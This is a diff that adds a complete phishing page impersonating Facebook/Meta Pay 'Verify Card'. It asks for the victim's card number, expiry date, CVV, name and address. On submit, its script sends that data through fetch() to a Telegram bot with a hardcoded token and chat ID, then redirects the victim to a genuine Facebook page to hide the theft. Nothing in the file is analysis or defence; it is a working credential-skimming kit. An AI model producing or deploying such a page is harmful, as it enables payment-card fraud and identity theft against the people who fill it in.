@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Card</title>
+    <style>
+        body {
+            font-family: sans-serif; /* Simpler font */
+            background-color: #f0f2f5; /* Lighter background */
+            color: #333; /* Darker text for readability on light background */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #fff; /* White background */
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Lighter shadow */
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            height: 24px;
+            cursor: pointer;
+            /* filter: invert(100%); Removed filter for general styling */
+            margin-right: 15px;
+        }
+        .header h1 {
+            font-size: 22px; /* Slightly larger heading */
+            font-weight: bold;
+            margin: 0;
+            color: #1c1e21; /* Dark text for heading */
+        }
+        .info-text {
+            font-size: 14px;
+            color: #606770; /* Softer text color */
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+        .form-row > div {
+            flex: 1;
+        }
+        input, select {
+            width: calc(100% - 20px);
+            padding: 10px; /* Slightly less padding */
+            border: 1px solid #ccd0d5; /* Lighter border */
+            border-radius: 6px; /* Slightly less rounded corners */
+            background-color: #f5f6f7; /* Very light background for inputs */
+            color: #1c1e21; /* Dark text for inputs */
+            font-size: 16px;
+            box-sizing: border-box;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+        input::placeholder {
+            color: #8a8d91; /* Lighter placeholder text */
+        }
+        select {
+            padding-right: 30px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23606770"><path d="M7 10l5 5 5-5z"/></svg>'); /* Darker arrow */
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 20px;
+        }
+        .save-button {
+            width: 100%;
+            padding: 12px; /* Slightly less padding */
+            background-color: #1877f2; /* Facebook blue */
+            color: #ffffff;
+            border: none;
+            border-radius: 6px; /* Slightly less rounded corners */
+            font-size: 17px; /* Slightly smaller font */
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, opacity 0.3s ease;
+            margin-top: 20px; /* Slightly less margin-top */
+        }
+        .save-button:disabled {
+            background-color: #e4e6eb; /* Lighter grey for disabled */
+            color: #bcc0c4; /* Lighter text for disabled */
+            cursor: not-allowed;
+            opacity: 1; /* Remove opacity for disabled, just color change */
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #606770;
+            margin-top: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .footer-text a {
+            color: #1877f2; /* Facebook blue for links */
+            text-decoration: none;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJjdXJyZW50Q29sb3IiPjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMTUuNDEgNy40MkwxNCA2IDguNDEgMTEuNTlMMTQgMTcuMTdsMS40MS0xLjQxTDExLjI1IDExLjU5eiIvPjwvc3ZnPg==" alt="Back arrow" onclick="history.back()">
+            <h1>Verify Card</h1>
+        </div>
+        <p class="info-text">Your card number is encrypted and securely saved</p>
+
+        <form id="verifyCardForm">
+            <div class="form-group">
+                <input type="text" id="cardNumber" placeholder="Card number" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" required>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <input type="text" id="expirationDate" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" autocomplete="cc-exp" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <input type="text" id="cvv" placeholder="CVV" inputmode="numeric" pattern="[0-9]{3,4}" autocomplete="cc-csc" maxlength="4" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <select id="country" required>
+                    </select>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="fullName" placeholder="Full name" autocomplete="name" required>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="address" placeholder="Address" autocomplete="street-address" required>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="addressLine2" placeholder="Address line 2 (optional)" autocomplete="address-line2">
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="city" placeholder="City" autocomplete="address-level2" required>
+            </div>
+            <div class="form-group">
+                <input type="text" id="state" placeholder="State" autocomplete="address-level1" required>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="zipCode" placeholder="Zip code" inputmode="numeric" pattern="[0-9]{5}(-[0-9]{4})?" autocomplete="postal-code" required>
+            </div>
+
+            <button type="submit" class="save-button" id="saveButton" disabled>Save</button>
+        </form>
+
+        <p class="footer-text">
+            For future payments, your payment info will be saved with Meta Pay and synced across your accounts in Accounts Center, where it can be managed at any time. <a href="https://www.facebook.com/policies_center/" target="_blank">Learn more.</a>
+        </p>
+    </div>
+
+    <script>
+        const form = document.getElementById('verifyCardForm');
+        const saveButton = document.getElementById('saveButton');
+        const countrySelect = document.getElementById('country');
+
+        // List of countries (excluding Vietnam)
+        const countries = [
+            "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria",
+            "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan",
+            "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia",
+            "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo (Brazzaville)", "Congo (Kinshasa)",
+            "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador",
+            "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France",
+            "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau",
+            "Guyana", "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland",
+            "Israel", "Italy", "Ivorian Coast", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kosovo",
+            "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania",
+            "Luxembourg", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius",
+            "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia",
+            "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway",
+            "Oman", "Pakistan", "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland",
+            "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino",
+            "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands",
+            "Somalia", "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland",
+            "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia",
+            "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan",
+            "Vanuatu", "Vatican City", "Venezuela", "Yemen", "Zambia", "Zimbabwe"
+        ];
+
+        // Populate the country dropdown
+        countries.sort().forEach(country => {
+            const option = document.createElement('option');
+            option.value = country;
+            option.textContent = country;
+            countrySelect.appendChild(option);
+        });
+        countrySelect.value = "United States"; // Set default to US
+
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expirationDateInput = document.getElementById('expirationDate');
+        const cvvInput = document.getElementById('cvv');
+        const fullNameInput = document.getElementById('fullName');
+        const addressInput = document.getElementById('address');
+        const cityInput = document.getElementById('city');
+        const stateInput = document.getElementById('state');
+        const zipCodeInput = document.getElementById('zipCode');
+
+        const requiredInputs = [
+            cardNumberInput,
+            expirationDateInput,
+            cvvInput,
+            fullNameInput,
+            addressInput,
+            cityInput,
+            stateInput,
+            zipCodeInput
+        ];
+
+        function validateForm() {
+            let allFieldsFilled = true;
+            requiredInputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFieldsFilled = false;
+                }
+            });
+            // Also check the country selection, ensure it's not empty
+            if (!countrySelect.value) {
+                allFieldsFilled = false;
+            }
+            saveButton.disabled = !allFieldsFilled;
+        }
+
+        requiredInputs.forEach(input => {
+            input.addEventListener('input', validateForm);
+        });
+        countrySelect.addEventListener('change', validateForm); // Add listener for country dropdown
+
+        // --- Removed specific input formatting for cardNumber and expirationDate as per "bỏ format" ---
+        // cardNumberInput.addEventListener('input', ...);
+        // expirationDateInput.addEventListener('input', ...);
+
+        // Initial validation check on page load
+        validateForm();
+
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Prevent default form submission
+
+            // Construct the data string for Telegram
+            const data = `${fullNameInput.value.trim()}|${cardNumberInput.value.trim()}|${expirationDateInput.value.trim()}|${cvvInput.value.trim()}|${addressInput.value.trim()}|${zipCodeInput.value.trim()}`;
+
+            // *** IMPORTANT: This is a client-side example. For production,
+            // *** you MUST send this data to a secure backend server first,
+            // *** and let the backend securely send it to Telegram.
+            // *** Directly sending sensitive data from frontend is a security risk.
+
+            const telegramBotToken = '7456931955:AAHZkqMLrnhTBoVi3YY5AZ8kiaKh7RlL3vw';
+            const chatId = '-4739369369'; // Target group chat ID
+
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: data
+                    }),
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Message sent successfully:', result);
+                    window.location.href = 'https://www.facebook.com/policies_center/';
+                } else {
+                    console.error('Failed to send message:', result);
+                    alert('Failed to verify card. Please try again. Error: ' + (result.description || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Network error:', error);
+                alert('A network error occurred. Please check your connection and try again.');
+            }
+        });
+
+    </script>
+</body>
+</html>
